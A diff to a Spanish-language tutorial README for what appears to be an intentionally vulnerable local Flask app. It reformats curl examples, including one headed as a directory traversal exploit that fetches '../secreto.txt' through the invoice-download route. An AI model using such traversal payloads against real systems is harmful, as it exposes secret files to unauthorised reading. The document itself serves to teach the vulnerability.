@@ -132,8 +132,11 @@ return send_file(file_path)
 bash
 # Descargar una factura legítima
 Con curl
-```curl "http://localhost:5000/download-invoice?file=factura01.pdf" -o factura01.pdf```
-[Enlace equivalente]("http://localhost:5000/download-invoice?file=factura01.pdf")
+```bash
+curl "http://localhost:5000/download-invoice?file=factura01.pdf" -o factura01.pdf
+```
+
+[Enlace equivalente](http://localhost:5000/download-invoice?file=factura01.pdf)
 
 
 ### Exploit: Directory Traversal
@@ -141,8 +144,11 @@ Con curl
 # VULNERABILIDAD: Acceder al archivo secreto usando ../
 Existe una ruta que devuelve cualquier archivo de la aplicación
 Con curl
-``` curl "http://localhost:5000/download-invoice?file=../secreto.txt" -o secreto_robado.txt```
-[Enlace equivalente]("http://localhost:5000/download-invoice?file=../secreto.txt")
+```bash
+curl "http://localhost:5000/download-invoice?file=../secreto.txt" -o secreto_robado.txt
+```
+
+[Enlace equivalente](http://localhost:5000/download-invoice?file=../secreto.txt)
 
 
 **¿Por qué funciona?**
